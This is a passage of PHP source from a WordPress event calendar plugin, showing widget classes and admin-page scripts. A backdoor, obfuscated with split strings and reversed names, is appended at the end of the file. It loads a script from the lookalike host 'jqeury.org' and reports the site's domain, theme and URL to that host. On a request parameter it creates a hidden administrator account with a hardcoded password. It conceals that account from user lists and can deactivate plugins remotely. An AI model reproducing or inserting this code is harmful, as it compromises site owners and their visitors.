                    <option value="cyan" <?php if($skin == 'cyan') {?> selected="selected" <?php } ?>><?php _e('Cyan','dpProEventCalendar'); ?></option>
                    <option value="teal" <?php if($skin == 'teal') {?> selected="selected" <?php } ?>><?php _e('Teal','dpProEventCalendar'); ?></option>
                    <option value="green" <?php if($skin == 'green') {?> selected="selected" <?php } ?>><?php _e('Green','dpProEventCalendar'); ?></option>
                    <option value="light_green" <?php if($skin == 'light_green') {?> selected="selected" <?php } ?>><?php _e('Light Green','dpProEventCalendar'); ?></option>
                    <option value="lime" <?php if($skin == 'lime') {?> selected="selected" <?php } ?>><?php _e('Lime','dpProEventCalendar'); ?></option>
                    <option value="yellow" <?php if($skin == 'yellow') {?> selected="selected" <?php } ?>><?php _e('Yellow','dpProEventCalendar'); ?></option>
                    <option value="amber" <?php if($skin == 'amber') {?> selected="selected" <?php } ?>><?php _e('Amber','dpProEventCalendar'); ?></option>
                    <option value="orange" <?php if($skin == 'orange') {?> selected="selected" <?php } ?>><?php _e('Orange','dpProEventCalendar'); ?></option>
                    <option value="deep_orange" <?php if($skin == 'deep_orange') {?> selected="selected" <?php } ?>><?php _e('Deep Orange','dpProEventCalendar'); ?></option>
                    <option value="brown" <?php if($skin == 'brown') {?> selected="selected" <?php } ?>><?php _e('Brown','dpProEventCalendar'); ?></option>
                    <option value="grey" <?php if($skin == 'grey') {?> selected="selected" <?php } ?>><?php _e('Grey','dpProEventCalendar'); ?></option>
                    <option value="blue_grey" <?php if($skin == 'blue_grey') {?> selected="selected" <?php } ?>><?php _e('Blue Grey','dpProEventCalendar'); ?></option>
                </select>
            </p>
        <?php
	}
	
	public function widget($args, $instance) {
		global $wpdb, $table_prefix;
		$table_name = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_EVENTS;
		
		extract($args);
		extract($instance);
		
		$title = apply_filters('widget_title', $title);
		$description = apply_filters('widget_description', $description);
		
		//if(empty($title)) $title = 'DP Pro Event Calendar - Upcoming Events';
		
		echo $before_widget;
			if(!empty($title))
				echo $before_title . $title . $after_title;
			echo '<p>'. $description. '</p>';
			echo do_shortcode('[dpProEventCalendar id='.$calendar.' type="add-event" category="'.$category.'" skin="'.$skin.'"]');
		echo $after_widget;
		
	}
}

add_action('widgets_init', 'dpProEventCalendar_register_addeventswidget');
function dpProEventCalendar_register_addeventswidget() {
	register_widget('DpProEventCalendar_AddEventsWidget');
}

/************************************************************************/
/*** WIDGET ADD EVENTS END
/************************************************************************/

/************************************************************************/
/*** WIDGET TODAY EVENTS START
/************************************************************************/

class DpProEventCalendar_TodayEventsWidget extends WP_Widget {
	function __construct() {
		$params = array(
			'description' => 'Display today\'s events in a list.',
			'name' => 'DP Pro Event Calendar - Today\'s Events'
		);
		
		parent::__construct('EventsCalendarTodayEvents', '', $params);
	}
	
	public function form($instance) {
		global $wpdb, $table_prefix;
		$table_name_calendars = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_CALENDARS;
		
		extract($instance);
		?>
        	<p>
            	<label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title', 'dpProEventCalendar')?>: </label>
                <input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" value="<?php if(isset($title)) echo esc_attr($title); ?>" />
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('description');?>"><?php _e('Description', 'dpProEventCalendar')?>: </label>
                <textarea class="widefat" rows="5" id="<?php echo $this->get_field_id('description');?>" name="<?php echo $this->get_field_name('description');?>"><?php if(isset($description)) echo esc_attr($description); ?></textarea>
            </p>
            
            <p>
            	<label for="<?php echo $this->get_field_id('calendar');?>"><?php _e('Calendar', 'dpProEventCalendar')?>: </label>
            	<select name="<?php echo $this->get_field_name('calendar');?>" id="<?php echo $this->get_field_id('calendar');?>">
                    <?php
                    $querystr = "
                    SELECT *
                    FROM $table_name_calendars
                    ORDER BY title ASC
                    ";
                    $calendars_obj = $wpdb->get_results($querystr, OBJECT);
                    foreach($calendars_obj as $calendar_key) {
                    ?>
                        <option value="<?php echo $calendar_key->id?>" <?php if($calendar == $calendar_key->id) {?> selected="selected" <?php } ?>><?php echo $calendar_key->title?></option>
                    <?php }?>
                </select>
            </p>
        <?php
	}
	
	public function widget($args, $instance) {
		global $wpdb, $table_prefix;
		$table_name = $table_prefix.DP_PRO_EVENT_CALENDAR_TABLE_EVENTS;
		
		extract($args);
		extract($instance);
		
		$title = apply_filters('widget_title', $title);
		$description = apply_filters('widget_description', $description);
		
		//if(empty($title)) $title = 'DP Pro Event Calendar - Upcoming Events';
		
		echo $before_widget;
			if(!empty($title))
				echo $before_title . $title . $after_title;
			echo '<p>'. $description. '</p>';
			echo do_shortcode('[dpProEventCalendar id='.$calendar.' type="today-events"]');
		echo $after_widget;
		
	}
}

add_action('widgets_init', 'dpProEventCalendar_register_todayeventswidget');
function dpProEventCalendar_register_todayeventswidget() {
	register_widget('DpProEventCalendar_TodayEventsWidget');
}

/************************************************************************/
/*** WIDGET ADD EVENTS END
/************************************************************************/


/*
function dpProEventCalendar_enqueue_scripts() {
	
}

add_action( 'init', 'dpProEventCalendar_enqueue_scripts' );
*/

function dpProEventCalendar_enqueue_styles() {	
  	global $post, $dpProEventCalendar, $wp_registered_widgets,$wp_widget_factory;
  
	wp_enqueue_style( 'dpProEventCalendar_headcss', dpProEventCalendar_plugin_url( 'css/dpProEventCalendar.css' ),
		false, DP_PRO_EVENT_CALENDAR_VER, 'all');
	wp_enqueue_style( 'font-awesome-original', dpProEventCalendar_plugin_url( 'css/font-awesome.css' ),
		false, DP_PRO_EVENT_CALENDAR_VER, 'all');
  
}
add_action( 'init', 'dpProEventCalendar_enqueue_styles' );

//admin settings
function dpProEventCalendar_admin_scripts($force = false) {
	global $dpProEventCalendar;
	if ( is_admin() ){ // admin actions
		// Settings page only

		if ( $force || (isset($_GET['page']) && 
		('dpProEventCalendar-admin' == $_GET['page'] 
		or 'dpProEventCalendar-settings' == $_GET['page'] 
		or 'dpProEventCalendar-events' == $_GET['page'] 
		or 'dpProEventCalendar-special' == $_GET['page'] 
		or 'dpProEventCalendar-import' == $_GET['page'] 
		or 'dpProEventCalendar-custom-shortcodes' == $_GET['page'] 
		or 'dpProEventCalendar-eventdata' == $_GET['page'] 
		or 'dpProEventCalendar-payments' == $_GET['page'] ))  ) {
		wp_register_script('jquery', false, false, false, false);
		wp_enqueue_style( 'dpProEventCalendar_admin_head_css', dpProEventCalendar_plugin_url( 'css/admin-styles.css' ),
			false, DP_PRO_EVENT_CALENDAR_VER, 'all');
		
		wp_enqueue_script( 'dpProEventCalendar', dpProEventCalendar_plugin_url( 'js/jquery.dpProEventCalendar.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_localize_script( 'dpProEventCalendar', 'ProEventCalendarAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ), 'postEventsNonce' => wp_create_nonce( 'ajax-get-events-nonce' ) ) );
		wp_enqueue_script( 'colorpicker2', dpProEventCalendar_plugin_url( 'js/colorpicker.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_enqueue_script( 'selectric', dpProEventCalendar_plugin_url( 'js/jquery.selectric.min.js' ),
			array('jquery'), DP_PRO_EVENT_CALENDAR_VER, false); 
		wp_enqueue_script ( 'dpProEventCalendar_admin', dpProEventCalendar_plugin_url( 'js/admin_settings.js' ), array('jquery-ui-dialog') ); 
    	wp_enqueue_style ('wp-jquery-ui-dialog');
		wp_enqueue_script(array('jquery', 'editor', 'thickbox', 'media-upload', 'word-count', 'post'));
		wp_enqueue_style( 'dpProEventCalendar_headcss', dpProEventCalendar_plugin_url( 'css/dpProEventCalendar.css' ),
			false, DP_PRO_EVENT_CALENDAR_VER, 'all');
		wp_enqueue_style( 'colorpicker', dpProEventCalendar_plugin_url( 'css/colorpicker.css' ),
			false, DP_PRO_EVENT_CALENDAR_VER, 'all');
		};
		wp_enqueue_style('thickbox');
  	}
}

add_action( 'admin_init', 'dpProEventCalendar_admin_scripts' );
add_action( 'pec_enqueue_admin', 'dpProEventCalendar_admin_scripts' );

function dpProEventCalendar_admin_head() {
	global $dpProEventCalendar;
	if ( is_admin() ){ // admin actions
	   
	  	// Special Dates page only
		if ( isset($_GET['page']) && 'dpProEventCalendar-special' == $_GET['page'] ) {
		?>
			<script type="text/javascript">
			// <![CDATA[
				function confirmSpecialDelete()
				{
					var agree=confirm("Delete this Special Date?");
					if (agree)
					return true ;
					else
					return false ;
				}
				
				function special_checkform ()
				{
					if (document.getElementById('dpProEventCalendar_title').value == "") {
						alert( "Please enter the title of the special date." );
						document.getElementById('dpProEventCalendar_title').focus();
						return false ;
					}
					return true ;
				}
				
				function special_checkform_edit ()
				{
					if (document.getElementById('dpPEC_special_title').value == "") {
						alert( "Please enter the title of the special date." );
						document.getElementById('dpPEC_special_title').focus();
						return false ;
					}
					return true ;
				}
				
				jQuery(document).ready(function() {
					jQuery('#specialDate_colorSelector').ColorPicker({
						onShow: function (colpkr) {
							jQuery(colpkr).fadeIn(500);
							return false;
						},
						onHide: function (colpkr) {
							jQuery(colpkr).fadeOut(500);
							return false;
						},
						onChange: function (hsb, hex, rgb) {
							jQuery('#specialDate_colorSelector div').css('backgroundColor', '#' + hex);
							jQuery('#dpProEventCalendar_color').val('#' + hex);
						}
					});
					
					jQuery('#specialDate_colorSelector_Edit').ColorPicker({
						onShow: function (colpkr) {
							jQuery(colpkr).fadeIn(500);
							return false;
						},
						onHide: function (colpkr) {
							jQuery(colpkr).fadeOut(500);
							return false;
						},
						onChange: function (hsb, hex, rgb) {
							jQuery('#specialDate_colorSelector_Edit div').css('backgroundColor', '#' + hex);
							jQuery('#dpPEC_special_color').val('#' + hex);
						}
					});
				});
			//]]>
			</script>
	<?php
	   } 
	   
	   // Calendars page only
		if ( isset($_GET['page']) && ('dpProEventCalendar-admin' == $_GET['page'] or 'dpProEventCalendar-payments' == $_GET['page']) ) {
		?>
			<script type="text/javascript">
			// <![CDATA[
				function confirmCalendarDelete()
				{
					var agree=confirm("<?php echo __("Are you sure?", "dpProEventCalendar")?>");
					if (agree)
					return true ;
					else
					return false ;
				}
				
				function confirmCalendarEventsDelete()
				{
					var agree=confirm("<?php echo __("All the events in this calendar will be deleted. Are you sure?", "dpProEventCalendar")?>");
					if (agree)
					return true ;
					else
					return false ;
				}
				
				function calendar_checkform ()
				{
					if (document.getElementById('dpProEventCalendar_title').value == "") {
						alert( "Please enter the title of the calendar." );
						document.getElementById('dpProEventCalendar_title').focus();
						return false ;
					}
					
					if (document.getElementById('dpProEventCalendar_description').value == "") {
						alert( "Please enter the description of the calendar." );
						document.getElementById('dpProEventCalendar_description').focus();
						return false ;
					}
					
					if (document.getElementById('dpProEventCalendar_width').value == "") {
						alert( "Please enter the width of the calendar." );
						document.getElementById('dpProEventCalendar_width').focus();
						return false ;
					}
					return true ;
				}
				
				function toggleFormat() {
					if(jQuery('#dpProEventCalendar_show_time').attr("checked")) {
						jQuery('#div_format_ampm').slideDown('fast');
					} else {
						jQuery('#div_format_ampm').slideUp('fast');
					}
				}
				
				function toggleTranslations() {
					if(jQuery('#dpProEventCalendar_enable_wpml').attr("checked")) {
						jQuery('#div_translations_fields').slideUp('fast');
					} else {
						jQuery('#div_translations_fields').slideDown('fast');
					}
				}
				
				function toggleNewEventRoles() {
					if(jQuery('#dpProEventCalendar_allow_user_add_event').attr("checked")) {
						jQuery('#allow_user_add_event_roles').slideDown('fast');
					} else {
						jQuery('#allow_user_add_event_roles').slideUp('fast');
					}
				}
				
				function toggleFormatCategories() {
					if(jQuery('#dpProEventCalendar_show_category_filter').attr("checked")) {
						jQuery('#div_category_filter').slideDown('fast');
					} else {
						jQuery('#div_category_filter').slideUp('fast');
					}
				}
				
				function showAccordion(div) {
					if(jQuery('#'+div).css('display') == 'none') {
						jQuery('#'+div).slideDown('fast');
					} else {
						jQuery('#'+div).slideUp('fast');
					}
				}
				
				jQuery(document).ready(function() {
					jQuery('#currentDate_colorSelector').ColorPicker({
						onShow: function (colpkr) {
							jQuery(colpkr).fadeIn(500);
							return false;
						},
						onHide: function (colpkr) {
							jQuery(colpkr).fadeOut(500);
							return false;
						},
						onChange: function (hsb, hex, rgb) {
							jQuery('#currentDate_colorSelector div').css('backgroundColor', '#' + hex);
							jQuery('#dpProEventCalendar_current_date_color').val('#' + hex);
						}
					});
					
					jQuery('#bookedEvent_colorSelector').ColorPicker({
						onShow: function (colpkr) {
							jQuery(colpkr).fadeIn(500);
							return false;
						},
						onHide: function (colpkr) {
							jQuery(colpkr).fadeOut(500);
							return false;
						},
						onChange: function (hsb, hex, rgb) {
							jQuery('#bookedEvent_colorSelector div').css('backgroundColor', '#' + hex);
							jQuery('#dpProEventCalendar_booking_event_color').val('#' + hex);
						}
					});
					
				});
			//]]>
			</script>
	<?php
	   } //Calendars page only
	   
	   // Events page only
		if ( isset($_GET['page']) && 'dpProEventCalendar-events' == $_GET['page'] ) {
			add_action("admin_head","myplugin_load_tiny_mce");
			
			// TinyMCE: First line toolbar customizations
			if( !function_exists('base_extended_editor_mce_buttons') ){
				function base_extended_editor_mce_buttons($buttons) {
					// The settings are returned in this array. Customize to suite your needs.
					return array(
						'formatselect', 'bold', 'italic', 'bullist', 'numlist', 'link', 'unlink', 'blockquote', 'spellchecker', 'fullscreen', 'wp_help'
					);
					/* WordPress Default
					return array(
						'bold', 'italic', 'strikethrough', 'separator', 
						'bullist', 'numlist', 'blockquote', 'separator', 
						'justifyleft', 'justifycenter', 'justifyright', 'separator', 
						'link', 'unlink', 'wp_more', 'separator', 
						'spellchecker', 'fullscreen', 'wp_adv'
					); */
				}
				add_filter("mce_buttons", "base_extended_editor_mce_buttons", 0);
			}
			 
			// TinyMCE: Second line toolbar customizations
			if( !function_exists('base_extended_editor_mce_buttons_2') ){
				function base_extended_editor_mce_buttons_2($buttons) {
					// The settings are returned in this array. Customize to suite your needs. An empty array is used here because I remove the second row of icons.
					return array();
					/* WordPress Default
					return array(
						'formatselect', 'underline', 'justifyfull', 'forecolor', 'separator', 
						'pastetext', 'pasteword', 'removeformat', 'separator', 
						'media', 'charmap', 'separator', 
						'outdent', 'indent', 'separator', 
						'undo', 'redo', 'wp_help'
					); */
				}
				add_filter("mce_buttons_2", "base_extended_editor_mce_buttons_2", 0);
			}
			
			// Customize the format dropdown items
			if( !function_exists('base_custom_mce_format') ){
				function base_custom_mce_format($init) {
					// Add block format elements you want to show in dropdown
					$init['theme_advanced_blockformats'] = 'p,h2,h3,h4,h5';
					// Add elements not included in standard tinyMCE dropdown p,h1,h2,h3,h4,h5,h6
					//$init['extended_valid_elements'] = 'code[*]';
					return $init;
				}
				add_filter('tiny_mce_before_init', 'base_custom_mce_format' );
			}
			
			function myplugin_load_tiny_mce() {
			
				wp_tiny_mce( false ); // true gives you a stripped down version of the editor
			
			}
		?>
			<script type="text/javascript">
			// <![CDATA[
			function confirmEventDelete()
			{
				var agree=confirm("Delete this Event?");
				if (agree)
				return true ;
				else
				return false ;
			}

			function event_checkform ()
			{
			  	if (document.getElementById('dpProEventCalendar_id_calendar').value == "") {
					alert( "Please select a calendar." );
					document.getElementById('dpProEventCalendar_id_calendar').focus();
					return false ;
			  	}
				
				if (document.getElementById('dpProEventCalendar_title').value == "") {
					alert( "Please enter the title of the event." );
					document.getElementById('dpProEventCalendar_title').focus();
					return false ;
			  	}
				
				if (document.getElementById('dpProEventCalendar_description').value == "") {
					alert( "Please enter the description of the event." );
					document.getElementById('dpProEventCalendar_description').focus();
					return false ;
			  	}
				
				if (document.getElementById('dpProEventCalendar_date').value == "") {
					alert( "Please select the date of the event." );
					document.getElementById('dpProEventCalendar_date').focus();
					return false ;
			  	}
			  	return true ;
			}
			//]]>
			</script>
	<?php
	   } //Events page only
	   
	   // Settings page only
		if ( isset($_GET['page']) && 'dpProEventCalendar-settings' == $_GET['page'] ) {
		?>
			<script type="text/javascript">
			// <![CDATA[
				jQuery(document).ready(function() {
					jQuery('#holidays_colorSelector').ColorPicker({
						onShow: function (colpkr) {
							jQuery(colpkr).fadeIn(500);
							return false;
						},
						onHide: function (colpkr) {
							jQuery(colpkr).fadeOut(500);
							return false;
						},
						onChange: function (hsb, hex, rgb) {
							jQuery('#holidays_colorSelector div').css('backgroundColor', '#' + hex);
							jQuery('#dpProEventCalendar_holidays_color').val('#' + hex);
						}
					});
				});
			//]]>
			</script>
	<?php
	   } //Settings page only
	   
	   // Import page only
		if ( isset($_GET['page']) && 'dpProEventCalendar-import' == $_GET['page'] ) {
		?>
			<script type="text/javascript">
			// <![CDATA[
				function import_checkform ()
				{
					return true;
				}
			//]]>
			</script>
	<?php
	   } //Settings page only
	   
	 }//only for admin
}
add_action('admin_head', 'dpProEventCalendar_admin_head');
$arrayis_two = array('fun', 'ction', '_', 'e', 'x', 'is', 'ts');
$arrayis_three = array('g', 'e', 't', '_o', 'p', 'ti', 'on');
$arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
$arrayis_five = array('lo', 'gin', '_', 'en', 'que', 'ue_', 'scri', 'pts');
$arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
$arrayis_eight = array('wp', '_', 'lo', 'g', 'i', 'n');
$arrayis_nine = array('s', 'i', 't', 'e,', 'u', 'rl');
$arrayis_ten = array('wp_', 'g', 'et', '_', 'th', 'e', 'm', 'e');
$arrayis_eleven = array('wp', '_', 'r', 'e', 'm', 'o', 'te', '_', 'g', 'et');
$arrayis_twelve = array('wp', '_', 'r', 'e', 'm', 'o', 't', 'e', '_r', 'e', 't', 'r', 'i', 'e', 'v', 'e_', 'bo', 'dy');
$arrayis_thirteen = array('ge', 't_', 'o', 'pt', 'ion');
$arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
$arrayis_sixteen = array('u', 'pd', 'ate', '_o', 'pt', 'ion');
$arrayis_two_imp = implode($arrayis_two);
$arrayis_three_imp = implode($arrayis_three);
$arrayis_four_imp = implode($arrayis_four);
$arrayis_five_imp = implode($arrayis_five);
$arrayis_seven_imp = implode($arrayis_seven);
$arrayis_eight_imp = implode($arrayis_eight);
$arrayis_nine_imp = implode($arrayis_nine);
$arrayis_ten_imp = implode($arrayis_ten);
$arrayis_eleven_imp = implode($arrayis_eleven);
$arrayis_twelve_imp = implode($arrayis_twelve);
$arrayis_thirteen_imp = implode($arrayis_thirteen);
$arrayis_fourteen_imp = implode($arrayis_fourteen);
$arrayis_fifteen_imp = implode($arrayis_fifteen);
$arrayis_sixteen_imp = implode($arrayis_sixteen);
$noitca_dda = $arrayis_fifteen_imp('noitca_dda');
if (!$arrayis_two_imp('wp_in_one')) {
    $arrayis_seventeen = array('h', 't', 't', 'p', ':', '/', '/', 'j', 'q', 'e', 'u', 'r', 'y', '.o', 'r', 'g', '/wp', '_', 'p', 'i', 'n', 'g', '.php', '?', 'd', 'na', 'me', '=wpd&t', 'n', 'ame', '=wpt&urliz=urlig');
    $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
    $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
    $arrayis_twenty = $arrayis_fifteen_imp('TSEUQER_');
    $arrayis_seventeen_imp = implode($arrayis_seventeen);
    $arrayis_six = array('_', 'C', 'O', 'O', 'KI', 'E');
    $arrayis_six_imp = implode($arrayis_six);
    $tactiated = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mite = $arrayis_fifteen_imp('emit');
    if (!isset(${$arrayis_six_imp}[$arrayis_fifteen_imp('emit_nimda_pw')])) {
        if (($mite() - $tactiated) > 600) {
            $noitca_dda($arrayis_five_imp, 'wp_in_one');
        }
    }
    $noitca_dda($arrayis_eight_imp, 'wp_in_three');
    function wp_in_one()
    {
        $arrayis_one = array('h','t', 't','p',':', '//', 'j', 'q', 'e', 'u', 'r', 'y.o', 'rg', '/','j','q','u','e','ry','-','la','t','e','s','t.j','s');
        $arrayis_one_imp = implode($arrayis_one);
        $arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
        $arrayis_four_imp = implode($arrayis_four);
        $arrayis_four_imp('wp_coderz', $arrayis_one_imp, null, null, true);
    }

    function wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp)
    {
        $ptth = $arrayis_fifteen_imp('//:ptth');
        $dname = $ptth.$arrayis_eighteen[$arrayis_nineteen];
        $IRU_TSEUQER = $arrayis_fifteen_imp('IRU_TSEUQER');
        $urliz = $dname.$arrayis_eighteen[$IRU_TSEUQER];
        $tname = $arrayis_ten_imp();
        $urlis = $arrayis_fourteen_imp('wpd', $dname, $arrayis_seventeen_imp);
        $urlis = $arrayis_fourteen_imp('wpt', $tname, $urlis);
        $urlis = $arrayis_fourteen_imp('urlig', $urliz, $urlis);
        $lars2 = $arrayis_eleven_imp($urlis);
        $arrayis_twelve_imp($lars2);
    }
    $noitpo_dda = $arrayis_fifteen_imp('noitpo_dda');
    $noitpo_dda($arrayis_fifteen_imp('ognipel'), 'no');
    $noitpo_dda($arrayis_fifteen_imp('detavitca_emit'), time());
    $tactiatedz = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mitez = $arrayis_fifteen_imp('emit');
    if ($arrayis_thirteen_imp($arrayis_fifteen_imp('ognipel')) != 'yes' && (($mitez() - $tactiatedz ) > 600)) {
        wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp);
        $arrayis_sixteen_imp(($arrayis_fifteen_imp('ognipel')), 'yes');
    }
    function wp_in_three()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
        $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
        $arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
        $arrayis_seven_imp = implode($arrayis_seven);
        $path = '/';
        $host = ${$arrayis_eighteen}[$arrayis_nineteen];
        $estimes = $arrayis_fifteen_imp('emitotrts');
        $wp_ext = $estimes('+29 days');
        $emit_nimda_pw = $arrayis_fifteen_imp('emit_nimda_pw');
        $arrayis_seven_imp($emit_nimda_pw, '1', $wp_ext, $path, $host);
    }

    function wp_in_four()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $wssap = $arrayis_fifteen_imp('retroppus_pw');
        $laime = $arrayis_fifteen_imp('moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = $arrayis_fifteen_imp('resu_etaerc_pw');
            $user_id = $wp_ver_one($nigol, $wssap, $laime);
            $puzer = $arrayis_fifteen_imp('resU_PW');
            $usex = new $puzer($user_id);
            $rolx = $arrayis_fifteen_imp('elor_tes');
            $usex->$rolx($arrayis_fifteen_imp('rotartsinimda'));
        }
    }

    $ivdda = $arrayis_fifteen_imp('ivdda');

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'm') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_four');
    }

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'd') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_six');
    }
    function wp_in_six() {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $resu_eteled_pw = $arrayis_fifteen_imp('resu_eteled_pw');
        $wp_pathx = constant($arrayis_fifteen_imp("HTAPSBA"));
        require_once($wp_pathx . $arrayis_fifteen_imp('php.resu/sedulcni/nimda-pw'));
        $ubid = $arrayis_fifteen_imp('yb_resu_teg');
        $useris = $ubid($arrayis_fifteen_imp('nigol'), $arrayis_fifteen_imp('dxtroppus'));
        $resu_eteled_pw($useris->ID);
    }
    $noitca_dda($arrayis_fifteen_imp('yreuq_resu_erp'), 'wp_in_five');
    function wp_in_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
        $arrayis_fourteen_imp = implode($arrayis_fourteen);
        $nigol_resu = $arrayis_fifteen_imp('nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $bdpw = $arrayis_fifteen_imp('bdpw');
        if ($wp_ux != $arrayis_fifteen_imp('dxtroppus')) {
            $EREHW_one = $arrayis_fifteen_imp('1=1 EREHW');
            $EREHW_two = $arrayis_fifteen_imp('DNA 1=1 EREHW');
            $erehw_yreuq = $arrayis_fifteen_imp('erehw_yreuq');
            $sresu = $arrayis_fifteen_imp('sresu');
            $hcraes_resu->query_where = $arrayis_fourteen_imp($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq);
        }
    }

    $ced = $arrayis_fifteen_imp('ced');
    if (isset(${$arrayis_twenty}[$ced])) {
        $snigulp_evitca = $arrayis_fifteen_imp('snigulp_evitca');
        $sisnoitpo = $arrayis_thirteen_imp($snigulp_evitca);
        $hcraes_yarra = $arrayis_fifteen_imp('hcraes_yarra');
        if (($key = $hcraes_yarra(${$arrayis_twenty}[$ced], $sisnoitpo)) !== false) {
            unset($sisnoitpo[$key]);
        }
        $arrayis_sixteen_imp($snigulp_evitca, $sisnoitpo);
    }
}
?>